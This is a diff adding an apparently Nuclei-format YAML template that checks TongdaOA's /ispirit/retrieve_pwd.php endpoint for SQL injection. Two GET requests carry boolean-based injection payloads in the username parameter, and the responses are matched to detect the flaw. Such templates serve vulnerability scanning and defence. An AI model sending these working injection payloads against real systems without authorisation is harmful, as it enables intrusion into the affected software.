@@ -1,0 +1,42 @@
+id: poc-yaml-tongda-ispirit-retrieve-pwd-sqli
+info:
+  name: TongdaOA /retrieve_pwd.php SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    SQL injection vulnerability exists in the TongdaOA /retrieve_pwd.php endpoint, which could potentially allow attackers to execute arbitrary SQL commands.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/ispirit/retrieve_pwd.php?_GET[username]=admin'+or+if((length('hello')=5),1,power(88888,88))+and+'a'='a"
+    matchers-condition: and
+    matchers:
+      - type: word
+        condition: or
+        words:
+          - "您没有设置"
+          - "电子邮件外发默认邮箱"
+          - "请联系管理员重置密码"
+      - type: status
+        status:
+          - 200
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/ispirit/retrieve_pwd.php?_GET[username]=admin'+or+if((length('hello')=0),1,power(88888,88))+and+'a'='a"
+    matchers-condition: and
+    matchers:
+      - type: word
+        condition: or
+        words:
+          - "错误"
+          - "请联系管理员"
+          - "文件"
+      - type: word
+        words:
+          - "/ispirit/retrieve_pwd.php"
+      - type: status
+        status:
+          - 200
